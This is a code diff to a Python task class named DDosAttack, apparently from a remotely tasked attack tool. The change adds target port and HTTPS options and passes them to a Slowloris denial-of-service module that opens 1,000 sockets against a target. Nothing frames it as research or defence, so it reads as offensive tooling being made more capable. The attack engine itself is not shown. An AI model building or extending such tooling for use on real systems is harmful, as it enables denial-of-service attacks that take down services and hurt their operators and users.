@@ -10,11 +10,15 @@ from app.modules.attacks import Slowloris
 class DDosAttack(Task):
     def __init__(self, task_data):
         super().__init__(task_data)
-        self.target = self.task_content['target']
         self.attack_type = self.task_content['attack_type']
+        self.target = self.task_content['target']
+        self.port = int(self.task_content['port'])
+        self.https = True if ('https' in self.task_content and self.task_content['https'] == 'y') else False
         from app.components import logger
-        logger.log(self.target, 'DEBUG')
         logger.log(self.attack_type, 'DEBUG')
+        logger.log(self.target, 'DEBUG')
+        logger.log(self.port, 'DEBUG')
+        logger.log(self.https, 'DEBUG')
 
     def start(self):
         # here comes the sugar
@@ -22,7 +26,8 @@ class DDosAttack(Task):
         logger.log('starting ddos module...', 'OTHER')
 
         if self.attack_type == 'slowloris':
-            attack = Slowloris(self.target, to_stop_at=self.to_stop_at, n_sockets=1000)
+            attack = Slowloris(self.target, port=self.port, to_stop_at=self.to_stop_at, enable_https=self.https,
+                               n_sockets=1000)
             attack.run()
             logger.log('slowloris executed', 'OTHER')
             self.result = attack.report
